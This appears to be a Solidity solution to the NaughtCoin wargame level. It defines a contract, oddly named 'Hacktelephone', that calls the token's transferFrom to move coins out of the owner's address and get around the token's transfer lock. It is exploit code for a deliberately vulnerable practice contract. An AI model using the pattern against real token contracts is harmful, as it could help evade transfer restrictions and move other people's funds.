interface NaughtCoin{
     function transferFrom(address fromWhom, address _to, uint256 _value) external returns(bool);
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hacktelephone {

    address public owner;
    NaughtCoin public naughtCoin;

    constructor(address _naughtCoinAddress) {
        owner = msg.sender;
       naughtCoin = NaughtCoin(_naughtCoinAddress);
    }

    function sendToken(address _recipientAddress, uint256 _amount) external {
        naughtCoin.transferFrom(owner,_recipientAddress,_amount);
    }


}
